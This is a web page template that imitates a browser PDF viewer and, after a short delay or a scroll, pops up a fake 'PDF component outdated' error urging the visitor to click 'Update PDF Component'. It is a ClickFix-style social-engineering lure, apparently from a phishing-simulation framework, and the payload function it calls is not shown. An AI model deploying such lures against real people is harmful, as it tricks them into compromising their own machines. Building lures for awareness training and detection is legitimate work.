{% extends "base_layout.html" %}

{% block title %}Document Viewer - Loading PDF{% endblock %}

{% block content %}
<!-- Decoy Layer: Browser-based PDF Viewer -->
<div id="decoy-layer" style="background-color: #525659; min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column;">
    
    <!-- Browser-style Toolbar -->
    <div style="background: #323639; padding: 8px 16px; display: flex; align-items: center; gap: 16px; border-bottom: 1px solid #1a1a1a;">
        
        <!-- Navigation Controls -->
        <div style="display: flex; align-items: center; gap: 8px;">
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            </button>
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
            </button>
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            </button>
        </div>

        <!-- URL Bar -->
        <div style="flex: 1; background: #202124; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 10px;">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#9aa0a6"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            <span style="color: #9aa0a6; font-size: 14px;">https://docs.corporate-portal.com/view/Contract_Agreement_2024.pdf</span>
        </div>

        <!-- Browser Actions -->
        <div style="display: flex; align-items: center; gap: 12px;">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6" style="cursor: pointer;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6" style="cursor: pointer;"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
        </div>
    </div>

    <!-- PDF Viewer Toolbar -->
    <div style="background: #3c4043; padding: 8px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #5f6368;">
        <div style="display: flex; align-items: center; gap: 16px;">
            <!-- PDF Icon and Name -->
            <div style="display: flex; align-items: center; gap: 10px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="#ea4335">
                    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/>
                </svg>
                <span style="color: #e8eaed; font-size: 14px; font-weight: 500;">Contract_Agreement_2024.pdf</span>
            </div>
            
            <!-- Page Navigation -->
            <div style="display: flex; align-items: center; gap: 8px; color: #9aa0a6; font-size: 13px;">
                <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
                </button>
                <span>1 / 12</span>
                <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
                </button>
            </div>
        </div>

        <!-- Viewer Controls -->
        <div style="display: flex; align-items: center; gap: 12px;">
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;" title="Zoom Out">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 13H5v-2h14v2z"/></svg>
            </button>
            <span style="color: #9aa0a6; font-size: 13px;">100%</span>
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;" title="Zoom In">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
            </button>
            <div style="width: 1px; height: 20px; background: #5f6368; margin: 0 8px;"></div>
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;" title="Download">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
            </button>
            <button style="background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 6px;" title="Print">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 8H5c-1.66 0-3 1.34-3 3v6h4v4h12v-4h4v-6c0-1.66-1.34-3-3-3zm-3 11H8v-5h8v5zm3-7c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-1-9H6v4h12V3z"/></svg>
            </button>
        </div>
    </div>

    <!-- PDF Content Area -->
    <div style="flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; position: relative;">
        
        <!-- Loading State -->
        <div id="pdf-loading" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 10;">
            <!-- Spinner -->
            <div style="width: 60px; height: 60px; margin: 0 auto 20px auto; border: 4px solid #5f6368; border-top-color: #8ab4f8; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            <p style="color: #e8eaed; font-size: 16px; margin: 0 0 8px 0;">Loading document...</p>
            <p style="color: #9aa0a6; font-size: 13px; margin: 0;">Initializing PDF renderer</p>
        </div>

        <!-- Blurred PDF Preview (Background) -->
        <div style="background: white; width: 100%; max-width: 800px; min-height: 600px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); border-radius: 4px; padding: 60px; filter: blur(4px); opacity: 0.6;">
            <!-- Fake Document Content -->
            <div style="border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 30px;">
                <h1 style="font-size: 24px; color: #333; margin: 0 0 10px 0;">SERVICE AGREEMENT</h1>
                <p style="color: #666; font-size: 14px; margin: 0;">Contract Reference: SA-2024-00847</p>
            </div>
            
            <div style="margin-bottom: 20px;">
                <h3 style="font-size: 14px; color: #333; margin: 0 0 10px 0;">1. PARTIES</h3>
                <p style="color: #666; font-size: 12px; line-height: 1.6; margin: 0;">This Service Agreement ("Agreement") is entered into as of November 28, 2024 ("Effective Date") by and between...</p>
            </div>
            
            <div style="margin-bottom: 20px;">
                <h3 style="font-size: 14px; color: #333; margin: 0 0 10px 0;">2. SERVICES</h3>
                <p style="color: #666; font-size: 12px; line-height: 1.6; margin: 0;">The Service Provider agrees to provide the following services to the Client in accordance with the terms and conditions set forth herein...</p>
            </div>
            
            <div style="margin-bottom: 20px;">
                <h3 style="font-size: 14px; color: #333; margin: 0 0 10px 0;">3. COMPENSATION</h3>
                <p style="color: #666; font-size: 12px; line-height: 1.6; margin: 0;">In consideration for the Services, Client shall pay Service Provider the fees as outlined in Schedule A attached hereto...</p>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{# Define embedded attack layer - only shown if no external trap_type is set #}
{% block attack_layer %}
{% if not trap_type %}
<!-- Attack Layer: PDF Renderer Error -->
<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); backdrop-filter: blur(4px); z-index: 900; justify-content: center; align-items: center;">
    <div style="background: white; max-width: 460px; width: 90%; border-radius: 8px; box-shadow: 0 25px 60px rgba(0,0,0,0.4); overflow: hidden;">
        
        <!-- Header -->
        <div style="background: #f8f9fa; padding: 20px; border-bottom: 1px solid #e8eaed; display: flex; align-items: center; gap: 15px;">
            <div style="background: #fce8e6; padding: 12px; border-radius: 50%;">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="#d93025">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
            </div>
            <div>
                <h2 style="margin: 0; color: #202124; font-size: 18px; font-weight: 600;">PDF Rendering Error</h2>
                <p style="margin: 4px 0 0 0; color: #5f6368; font-size: 13px;">Document cannot be displayed</p>
            </div>
        </div>

        <!-- Content -->
        <div style="padding: 24px;">
            
            <!-- Error Details -->
            <div style="background: #fef7e0; border: 1px solid #fdd663; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
                <div style="display: flex; align-items: flex-start; gap: 12px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#ea8600" style="flex-shrink: 0; margin-top: 2px;">
                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
                    </svg>
                    <div>
                        <p style="margin: 0; color: #3c4043; font-size: 14px; font-weight: 600;">PDF.js Component Outdated</p>
                        <p style="margin: 6px 0 0 0; color: #5f6368; font-size: 13px; line-height: 1.5;">
                            Your browser's PDF rendering component is out of date and cannot display this document securely.
                        </p>
                    </div>
                </div>
            </div>

            <!-- Technical Info -->
            <div style="background: #f8f9fa; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
                <h4 style="margin: 0 0 12px 0; font-size: 12px; font-weight: 600; color: #5f6368; text-transform: uppercase; letter-spacing: 0.5px;">Error Details</h4>
                <div style="font-family: 'Consolas', 'Monaco', monospace; font-size: 12px; color: #d93025; background: #fff; padding: 12px; border-radius: 4px; border: 1px solid #e8eaed;">
                    <p style="margin: 0 0 4px 0;">Error: PDF_RENDER_COMPONENT_OUTDATED</p>
                    <p style="margin: 0 0 4px 0;">Code: 0x80070005</p>
                    <p style="margin: 0;">Component: pdf.worker.js v2.9.359</p>
                </div>
            </div>

            <p style="margin: 0 0 20px 0; color: #5f6368; font-size: 13px; line-height: 1.6;">
                To view this document, you need to update the PDF rendering component. This is a quick process that will enable secure document viewing.
            </p>

            <button onclick="triggerClickFix()" style="width: 100%; background: #1a73e8; color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 6px; display: flex; align-items: center; justify-content: center; gap: 10px; transition: background 0.2s;" onmouseover="this.style.background='#1557b0'" onmouseout="this.style.background='#1a73e8'">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                    <path d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79 2.73 2.71 7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58 3.51-3.47 9.14-3.47 12.65 0L21 3v7.12zM12.5 8v4.25l3.5 2.08-.72 1.21L11 13V8h1.5z"/>
                </svg>
                Update PDF Component
            </button>

            <div style="margin-top: 16px; text-align: center;">
                <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none;">Download PDF instead</a>
                <span style="color: #dadce0; margin: 0 10px;">•</span>
                <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none;">Report issue</a>
            </div>
        </div>

        <!-- Footer -->
        <div style="padding: 12px 24px; background: #f8f9fa; border-top: 1px solid #e8eaed;">
            <p style="margin: 0; font-size: 11px; color: #80868b; text-align: center;">
                Secure Document Viewer • Protected Connection
            </p>
        </div>
    </div>
</div>
{% endif %}
{% endblock %}

{% block extra_css %}
<style>
@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}
</style>
{% endblock %}

{% block extra_js %}
<script>
    let triggered = false;

    function showLure() {
        if (!triggered) {
            triggered = true;
            // Hide loading spinner
            const pdfLoading = document.getElementById('pdf-loading');
            if (pdfLoading) pdfLoading.style.display = 'none';
            
            // Check for embedded attack layer first, then external trap overlays
            const attackLayer = document.getElementById('attack-layer') ||
                               document.getElementById('cf-overlay') ||
                               document.getElementById('chrome-overlay') ||
                               document.getElementById('wu-trigger-overlay') ||
                               document.getElementById('filefix-overlay');
            if (attackLayer) {
                attackLayer.style.display = 'flex';
            }
        }
    }

    // Simulate PDF loading then show error
    setTimeout(function() {
        if (!triggered) {
            showLure();
        }
    }, 2500);

    // Also trigger on scroll attempt
    document.addEventListener('wheel', function() {
        if (!triggered) {
            setTimeout(showLure, 500);
        }
    }, { once: true });
</script>
{% endblock %}